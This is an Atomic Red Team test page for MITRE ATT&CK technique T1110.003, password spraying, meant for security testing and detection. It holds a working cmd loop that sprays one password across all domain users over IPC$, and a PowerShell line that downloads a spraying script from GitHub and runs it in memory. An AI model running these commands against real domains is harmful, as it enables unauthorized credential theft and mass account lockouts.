# T1110.003 - Brute Force: Password Spraying
Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)

In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Password Spray all Domain Users
CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.
This atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\users.txt list. Any successful authentications will be printed to the screen with a message like "[*] username:password", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.
Use the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.
See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5
**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
```

Invoke-AtomicTest T1110.003 -TestNumbers 1

### Atomic Test #2 - Password Spray (DomainPasswordSpray)
Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain

https://github.com/dafthack/DomainPasswordSpray

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
```

Invoke-AtomicTest T1110.003 -TestNumbers 2

## Detection
Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.

Consider the following event IDs:(Citation: Trimarc Detecting Password Spraying)

* Domain Controllers: "Audit Logon" (Success & Failure) for event ID 4625.
* Domain Controllers: "Audit Kerberos Authentication Service" (Success & Failure) for event ID 4771.
* All systems: "Audit Logon" (Success & Failure) for event ID 4648.